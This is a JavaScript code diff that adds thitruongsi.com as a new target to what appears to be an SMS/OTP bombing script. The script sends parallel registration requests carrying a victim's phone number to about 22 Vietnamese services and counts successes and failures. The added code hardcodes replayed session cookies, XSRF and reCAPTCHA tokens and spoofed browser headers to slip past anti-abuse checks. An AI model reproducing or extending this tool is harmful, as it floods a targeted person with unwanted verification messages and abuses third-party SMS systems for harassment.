@@ -615,6 +615,52 @@ const payload = {
           'challenge_method': 'SHA256',
           'recaptcha_response': '03AFcWeA4KZqSQejuSnmkm5NLHnv2jrAlew4hLmnOMiDH7mZ20TfbdLgvb_iFXbQm9i8qccALnN2RayQRVgWM_EJlfStQ4-r6SEBkVOkBHRMiJjNJsa4ghuX8I48UKvE9r1BiEJ3_BBgRuBKN_s-X7vFt231Gis2cK9lbjOzt0x2MHWcEAfP6ixjN3-5fPL9ogloWRillgHqIgRk2F761fzfwgOH0ymjm0umHxZaRULHoegWjdoB3vXllk1DYhYo-y4xSxn7tq_e9OwVC2xIGjLtO5vR94BioeIrsr368CkZItqFTFmGKqcI12Dkr558aeR1CWoCt6ihiDDR8eoN1o68A4TOFA_TVu0VrCmmME-MrE1QI5ItocnoJaxcO5RKFFsIu1QYqtpX-N3cHQuP6P9phnMNmyVY8H5H_xSiTnceAA0CUlsAn9eubQHIlUPY_ok_IXLmAZ-iFOVMVv3AvRErpnHHAoLsdLyGRhysIk7ZNtpMh57e5tlTHezJr7CPpO7rchUDdM2mEnBD-bJPyMNtNyxe3LieCMvG32okTXvGjLbA6wcLiCIzwT6c5RtHFMqvq_FYfSTvOiKQITguDNWw3xR9SQT2RcJwbZh4JehwoYmakYj190l8EJ-_PiiknxDi2LhSp1FhRCObX0js7Sl-vfaHVrXRgPOF38gc_RRRfLBnT8g7jszvM8DdKfwY10l5lxaBW18j1hSWwpnZDDRlyKhn_TOqusm2e-XQbE-a1V26Ft3_QJfzL4Y9Eo2PQgrW7LKuPYCot9lWiX6QexWV5GNL4rNWt6mXQMJFCgoAlfmyrQey5tbv44eeFZOzWOZWy2OLedVy5bLwMh5TqOFowZ3yTPIt0NWVb005ElpX5NGKyLjSRKUlXSiuNTWSW6bNYPyZr3FcVpA5ONSrc0F4Ctl7HydtGF2KmULQVI8UWp73IqVL8E5HJGuKToPzRkZjNRXlvRerXacSb2bLiXioMR6KG6rtNpoRbgPu1GjH8v79BRXNFb9SZu1ADx0Sy-u00_CjeYuRj5gp32PprtOcj8BuMKaHdd9K2cAh9aXOvleES73qk3UlOodXrJa6apbj6PFpUtYE5qE3NaAENYz1rp6-NQ89FHR7KJ3OSnLZqcASGp7ba0gt-nsNXyr7qR-Dieg2alljtOzSYfF0F3_c2UMSnMjWTu65pKyPzLmBDr0KFIGvbrqd_kcdfpDdQIL2-4uCkZ_9DDomACMTIYtq9kCVh_XWW8iPEkMuwCDHACBFA7VO5SPMYYb7uMoqj90lQ0fTFI364lvYzvHXKlaU97Zng-XOJRS-dGlSyu0ceDi5iZqd1BiivlIConTRvFPvDEVvEDK2IILpeS8zx9LFInmTainw8CmU65quBQkM7bir8UG7hvL4-Aa940kxuiTB1SbAkVl_4y0LPoMZ_DHMGNp9CS_jDNr5IatcFICb-g67g_U2J1uJC44SigbOjuMIQSMqZjTk1iIa4vzCKThBeb-3ncif1We_ASXy8xuTQUc_w_zpp-bzL2F-jYi86omdge49GNQbr28gM6Sq57sSjjH6GJ0YyVVygaWO8mi9gkhyYmriG_xZiHJRK3Eco-Z3SBNHewpWCp', // Update with a valid reCAPTCHA response
         };
+
+    const thitruongsiCookies = {
+        '_ym_uid': '1693617049750570465',
+        '_ym_d': '1693617049',
+        '_hjSessionUser_1750246': 'eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=',
+        'tts-utm-source': 'googlese',
+        'tts_analytics_guest_id': 'v6xJVO1mOf6mRnBcj9dMa',
+        'XSRF-TOKEN': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
+        'laravel_session': 'NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz',
+        '_gcl_au': '1.1.869912624.1703861253',
+        '_ga': 'GA1.1.1625249642.1703861258',
+        'NPS_81d9bd77_last_seen': '1703861258680',
+        '_hjSessionUser_1638305': 'eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=',
+        '_hjFirstSeen': '1',
+        '_hjIncludedInSessionSample_1638305': '0',
+        '_hjSession_1638305': 'eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==',
+        '_fbp': 'fb.1.1703861263674.583644751',
+        '_ga_W85LP5ZTQK': 'GS1.1.1703861258.1.1.1703861266.52.0.0',
+        '_ym_isad': '1',
+        '_ym_visorc': 'w',
+        'tts_notify_request': 'true',
+      };
+
+    const thitruongsiHeaders = {
+      'authority': 'thitruongsi.com',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'content-type': 'application/json',
+        'dnt': '1',
+        'origin': 'https://thitruongsi.com',
+        'referer': 'https://thitruongsi.com/user/register',
+        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+        'x-xsrf-token': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
+    };
+
+    const thitruongsiData = {
+      'account_phone': phone,
+        'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA',
+    };
             
 
     // Initial message to be edited later
@@ -692,13 +738,14 @@ const payload = {
         axios.post('https://api.ahamove.com/api/v3/public/user/register', ahamoveData, { headers: ahamoveHeaders }), 
         axios.post('https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web', kidsplazaData, { headers: kidsplazaHeaders }), 
         axios.post('https://id.icankid.vn/api/otp/challenge/', idJsonData, { headers: idHeaders , cookies: idCookies }), 
+        axios.post('https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone', thitruongsiData, { headers: thitruongsiHeaders, cookies: thitruongsiCookies }), 
         ])
       .then(() => {
-        successCount += 21;
+        successCount += 22;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 21;
+        failureCount += 22;
         updateMessage();
       });
     };
